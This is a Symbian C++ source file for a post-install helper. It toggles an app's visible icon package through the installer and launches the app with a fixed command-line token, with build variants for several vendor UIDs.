/*
 ============================================================================
 Name		: PostInst.cpp
 Author	  : Suttiporn Nitipitayanusad
 Copyright   : Your copyright notice
 Description : Exe source file
 ============================================================================
 */

//  Include Files  

#include "PostInst.h"
#include <e32base.h>
#include <e32std.h>
//#include <e32cons.h>			// Console

#include <apgcli.h> // for RApaLsSession
#include <apacmdln.h> // for CApaCommandLine
#include <bautils.h>
#include <BACLINE.H> // CCommandLineArguments
#include <e32msgqueue.h>

//#if !__WINS__
#include "InstallActive.h"
//#endif

#include "DialogUtils.h"
#include "FileLogger.h"
#include "Properties.h"
#include "PlatformUtil.h"

// The reason of using macro, because if progrom to get private directory, cause KERN-EXE 3 when installer connect to server
// this because of about the time (too slow) 
//  Constants
#if defined __BUILD_MOMA__
	_LIT(KPostInstTxtName, "C:\\private\\2002E09B\\postinst.txt");
#elif defined __CHINESE_UNKNOWN_COMPANY_UID__
	_LIT(KPostInstTxtName, "C:\\private\\20048A95\\postinst.txt");
#elif defined __MINDPATH_UID__
	_LIT(KPostInstTxtName, "C:\\private\\20056B59\\postinst.txt");
#elif defined __MINDPATH2_UID__
	_LIT(KPostInstTxtName, "C:\\private\\20056B61\\postinst.txt");
#elif defined (__BUILD_FOR_FEELSECURE)
	_LIT(KPostInstTxtName, "C:\\private\\200664C7\\postinst.txt");
#else
	_LIT(KPostInstTxtName, "C:\\private\\2000B2C8\\postinst.txt");
#endif

_LIT(KAppUid, 			"APPUID");
_LIT(KKeyShowIcon, 		"S");
_LIT(KKeyShowIconUid, 	"SHUID");
_LIT(KSep, 				"\\");
_LIT(KPrivate, 			"private");

_LIT(KMessageQueueName,	"MsgInstQue");

const TUint KUidShow = 0x2000B2CA;

const TInt KMaxBuf = 20;

enum TApplicationUiCmd
	{
	ECommandNothing,
	ECommandInstallSHsis,
	ECommandUninstallSHsis
	};

void GetCommandLineTail(TDes8& aEndTail)
    {
    _LIT8(KTail1,"POSTINST:START");
    //_LIT8(KTail2,"54E7A68876CDFD068CFA0EF9013A835A");//fake
    aEndTail.Copy(KTail1);
    }

TApplicationUiCmd ReadApplicationUiCommand()
	{
	TApplicationUiCmd cmd;
	RMsgQueue <TInt> msgQueue;
	TInt err = msgQueue.OpenGlobal(KMessageQueueName);
	if (err)
		{
		cmd = ECommandNothing;
		}
	else
		{
		TInt cmdCode(0);
		err = msgQueue.Receive(cmdCode);
		if (err)
			{
			cmd = ECommandNothing;
			}
		else
			{
			cmd = (TApplicationUiCmd)cmdCode;
			}
		}
	msgQueue.Close();
	return cmd;
	}

void StartApplicationL(RApaLsSession& aAppSession, const TDesC& aExeName)
	{
	CApaCommandLine* cmdLine = CApaCommandLine::NewLC();
	cmdLine->SetExecutableNameL(aExeName);
	cmdLine->SetCommandL(EApaCommandOpen); //EApaCommandOpen, EApaCommandRun, EApaCommandBackground
	
	TBuf8<100> tail;
	//set trailling data
	GetCommandLineTail(tail);
	//dummy app.mgr will check this value and starts up if they are match
	cmdLine->SetTailEndL(tail);
	
	User::LeaveIfError(aAppSession.StartApp(*cmdLine));
	CleanupStack::PopAndDestroy(cmdLine);
	}

void Uninstall(CInstallActive* aInstallAct, const TUid& aAppUid)
	{
	User::After(5000000); // To prevent installer busy -30481
	aInstallAct->UninstallNow(aAppUid);
	CActiveScheduler::Start();
	}

void Install(CInstallActive* aInstallAct, const TDesC& aDrive, const TDesC& aUidStr, const TDesC& aIconFileName)
	{	
	TFullName iconPathName(aDrive);	
	iconPathName.Append(KSep);
	iconPathName.Append(KPrivate);
	iconPathName.Append(KSep);
	iconPathName.Append(aUidStr);
	iconPathName.Append(KSep);
	iconPathName.Append(aIconFileName);
	
	User::After(5000000); // To prevent installer busy -30481
	aInstallAct->InstallNow(iconPathName); // show icon
	CActiveScheduler::Start();
	}

void MainL()
	{
	User::After(2000000);
	TApplicationUiCmd cmd = ReadApplicationUiCommand();
	
	CInstallActive* installAct = CInstallActive::NewL();
	CleanupStack::PushL(installAct);
	
	// Open connection to file server
	RFs fs;
	User::LeaveIfError(fs.Connect());	
	CleanupClosePushL(fs);
	
	CProperties* prop = CProperties::NewL(fs, KPostInstTxtName);
	CleanupStack::PushL(prop);
	
	// AppUi uid string
	HBufC* appUidStr = prop->ValueLC(KAppUid);
	
	// Icon file name
	HBufC* iconFileName = prop->ValueLC(KKeyShowIcon);
	
	// Icon uid string
	HBufC* shUidStr = prop->ValueLC(KKeyShowIconUid);
	
	// AppUi uid
	TUint tmpUid(0);
	TLex lex(*appUidStr);
	User::LeaveIfError(lex.Val(tmpUid, EHex));
	TUid uidOfAppUi(TUid::Uid(tmpUid));
	
	// Icon uid
	lex.Assign(*shUidStr);
	User::LeaveIfError(lex.Val(tmpUid, EHex));
	TUid uidOfShowIcon(TUid::Uid(tmpUid));
	
	RApaLsSession apaLsSession;
	User::LeaveIfError(apaLsSession.Connect());
	CleanupClosePushL(apaLsSession);
		
	TApaAppInfo appInfo;
	TInt errAppInfo = apaLsSession.GetAppInfo(appInfo, uidOfAppUi);
		
	if(errAppInfo == KErrNone)
		{
		TPtrC pDrive = appInfo.iFullName.Mid(0, 2);
		// Do operations
		if (cmd == ECommandInstallSHsis)
			{
			Install(installAct, pDrive, *appUidStr, *iconFileName);
			}
		else if (cmd == ECommandUninstallSHsis)
			{
			Uninstall(installAct, uidOfShowIcon);
			}
		else
			{
#ifdef __BUILD_FOR_FEELSECURE
			StartApplicationL(apaLsSession, appInfo.iFullName);
#else
			TBool bClickYes = DialogUtils::ShowGlobalMsgAsConfirmationQueryL(0,0);
			if (bClickYes)
				{
				StartApplicationL(apaLsSession, appInfo.iFullName);
				
				//
				Uninstall(installAct, uidOfShowIcon);
				}
			else // Called by user click 'No'
				{
				Install(installAct, pDrive, *appUidStr, *iconFileName);
				}
#endif
			}

		}
	CleanupStack::PopAndDestroy(7); // installAct, fs, prop, appUidStr, iconFileName, shUidStr, apaLsSession
	}

void DoStartL()
	{
	// Create active scheduler (to run active objects)
	CActiveScheduler* scheduler = new (ELeave) CActiveScheduler();
	CleanupStack::PushL(scheduler);
	CActiveScheduler::Install(scheduler);
	
	MainL();
	
	// Delete active scheduler
	CleanupStack::PopAndDestroy(scheduler);
	}

TInt E32Main()
	{
	// Create cleanup stack
	__UHEAP_MARK;
	CTrapCleanup* cleanup = CTrapCleanup::New();

	// Run application code inside TRAP harness, wait keypress when terminated
	TRAPD(mainError, DoStartL());
	LOG("Leave code : %d", mainError);
	
	delete cleanup;
	__UHEAP_MARKEND;
	return KErrNone;
	}

